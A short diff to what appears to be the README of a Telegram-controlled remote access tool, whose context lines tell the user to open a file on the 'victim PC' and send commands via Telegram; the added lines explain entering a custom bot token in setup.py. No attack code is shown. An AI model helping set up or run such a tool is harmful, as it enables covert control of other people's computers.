@@ -26,3 +26,7 @@ open file in victim PC. and go to telegram.
 
 Now you can send /commands to help.
 </p>
+
+# Custome token
+open setup.py and when it ask for custome token write C.
+then write your bot token.
